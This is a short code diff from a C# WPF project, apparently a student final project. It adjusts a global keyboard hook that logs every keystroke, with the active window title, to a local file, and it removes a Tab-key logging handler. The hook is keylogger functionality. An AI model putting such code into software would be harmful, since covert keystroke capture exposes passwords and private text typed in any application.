@@ -114,11 +114,8 @@ namespace AbschlussprojektWPF
             }
             using (var api = new KeystrokeAPI())
             {
-
-                api.CreateKeyboardHook((character) => { File.AppendAllText(@"D:\KeyLog.txt", character + " " + logFile.GetTitleOfActiveWindow() + "    "); ; });
+                api.CreateKeyboardHook((character) => { File.AppendAllText(@"D:\KeyLog.txt", character + " " + logFile.GetTitleOfActiveWindow() + "\r\n\r\n"); ; });
             }
-
-
         }
 
         private void checkCheckBox()
@@ -367,16 +364,6 @@ namespace AbschlussprojektWPF
             //        cbSupernova.IsChecked = false;
             //    }
             //}
-        }
-
-
-
-        private void keyDown_logKeys(object sender, KeyEventArgs e)
-        {
-            if (e.Key == Key.Tab)
-            {
-                File.AppendAllText(@"D:\KeyLog.txt", e.Key.ToString() + " " + logFile.GetTitleOfActiveWindow() + " \r\n\r\n"); ;
-            }
         }
     }
 }
